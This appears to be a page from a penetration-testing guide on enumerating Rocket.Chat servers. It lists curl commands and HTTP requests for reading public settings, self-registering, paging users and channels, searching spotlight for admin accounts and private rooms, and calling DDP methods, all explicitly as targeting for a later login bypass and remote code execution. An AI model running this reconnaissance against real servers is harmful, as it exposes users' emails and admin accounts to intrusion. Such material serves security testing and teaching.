---
title: "Enumeration"
order: 1
description: "Harvesting a Rocket.Chat server through the REST API and DDP: reading settings.public unauthenticated, paging /api/v1/users.list and /api/v1/channels.list, pulling the directory through /api/v1/spotlight, and calling Meteor DDP methods over the websocket. Worked curl with X-Auth-Token and X-User-Id headers and interpretation of the JSON, with the version read from /api/info."
keywords:
  - rocket.chat enumeration
  - users.list
  - spotlight
  - settings.public
  - meteor ddp
---

# Enumeration

Rocket.Chat enumeration splits into what is readable with no credential (version and server settings) and what is readable with any authenticated token (the user and channel directory). The REST listing endpoints enforce permissions inconsistently across builds, and `spotlight` in particular is a search endpoint reachable by ordinary users that returns users and channels matching a term, so even a low-privilege token maps the directory. The output here feeds the login bypass and the admin-token chain in [server exploitation](server-exploitation.md).

## Unauthenticated: version and settings

`/api/info` gives the version; `/api/v1/settings.public` returns the public settings, which tell you whether registration is open, which OAuth providers are wired, and whether iframe/login customizations exist:

```bash
curl -sk http://<target>:3000/api/info
#   {"version":"6.5.0","success":true}
curl -sk http://<target>:3000/api/v1/settings.public | python3 -c 'import sys,json
for s in json.load(sys.stdin)["settings"]:
  if s["_id"] in ("Accounts_RegistrationForm","Accounts_RegistrationForm_SecretURL","LDAP_Enable","Accounts_OAuth_Custom"): print(s["_id"],"=",s.get("value"))'
```

```text
Accounts_RegistrationForm = Public      <- open registration: mint your own account
LDAP_Enable = false
```

`Accounts_RegistrationForm = Public` means you can register through `POST /api/v1/users.register` and get a token with no invite. If it is `Secret URL`, registration needs a token you do not have; fall back to the login bypass in [authentication](authentication.md).

## Getting a token

With open registration:

```http
POST /api/v1/users.register HTTP/1.1
Host: target:3000
Content-Type: application/json

{"username":"a1","email":"a@evil.test","pass":"Sprayed-Passw0rd!","name":"a1"}
```

Then `POST /api/v1/login` returns the credential pair used on every call below:

```text
{"status":"success","data":{"authToken":"xox...","userId":"aBcD..."}}
```

Rocket.Chat authenticates REST calls with two headers together: `X-Auth-Token: <authToken>` and `X-User-Id: <userId>`.

## Paging users and channels

```bash
AUTH='-H X-Auth-Token:<authToken> -H X-User-Id:<userId>'
curl -sk $AUTH "http://<target>:3000/api/v1/users.list?count=100&offset=0" \
  | python3 -c 'import sys,json;[print(u["username"],u.get("emails"),u.get("roles")) for u in json.load(sys.stdin)["users"]]'
```

```text
admin     [{'address': 'root@corp.test'}]   ['admin']
j.doe     [{'address': 'j.doe@corp.test'}]  ['user']
```

Read `roles`: an entry containing `admin` marks the accounts to target with the login bypass or to steal a token from, because an admin token is the precondition for the integration-script RCE. `channels.list` maps public channels; `channels.list.joined` and `im.list` show what your own account can already read:

```bash
curl -sk $AUTH "http://<target>:3000/api/v1/channels.list?count=100" | python3 -c 'import sys,json;[print(c["name"],c.get("t")) for c in json.load(sys.stdin)["channels"]]'
```

## Spotlight and directory

`spotlight` is the live client search and is reachable by any user, returning both users and rooms for a partial term, so it finds privileged naming patterns without the full listing permission:

```http
GET /api/v1/spotlight?query=admin HTTP/1.1
Host: target:3000
X-Auth-Token: <authToken>
X-User-Id: <userId>
```

```text
{"users":[{"username":"admin","name":"Root"}],"rooms":[{"name":"ops-secrets","t":"p"}],"success":true}
```

A room with `"t":"p"` is a private group; seeing it named in spotlight without membership is the enumeration lead-in to reading it once you hold an admin token.

## Meteor DDP methods

The same directory is reachable over the websocket by calling Meteor methods, which is useful where a REST endpoint is permission-gated but the DDP method is not. Connect to `/websocket` (or `/sockjs/.../websocket`), send the DDP `connect` frame, then call a method such as `getUsersOfRoom` or `spotlight`:

```json
{"msg":"method","method":"spotlight","params":["admin"],"id":"1"}
```

The `result` frame carries the same user/room data as the REST call. DDP also exposes `listEmojiCustom`, `getRoomRoles`, and subscription streams that leak membership.

## Follow-on

The user list (usernames, emails, `admin` roles) scopes the NoSQL login bypass in [authentication](authentication.md); the private-room names from spotlight are the targets to read once the bypass yields an admin token in [server exploitation](server-exploitation.md).

## Tools

- [RocketChat/Rocket.Chat (server source, to confirm per-build endpoint permissions)](https://github.com/RocketChat/Rocket.Chat)
- A WebSocket client (`wscat`, `websocat`) for the DDP method calls.

## References

- [Rocket.Chat API: users.list](https://developer.rocket.chat/apidocs/get-users-list)
- [Rocket.Chat API: spotlight](https://developer.rocket.chat/apidocs/spotlight)
- [Meteor DDP protocol specification](https://github.com/meteor/meteor/blob/devel/packages/ddp/DDP.md)
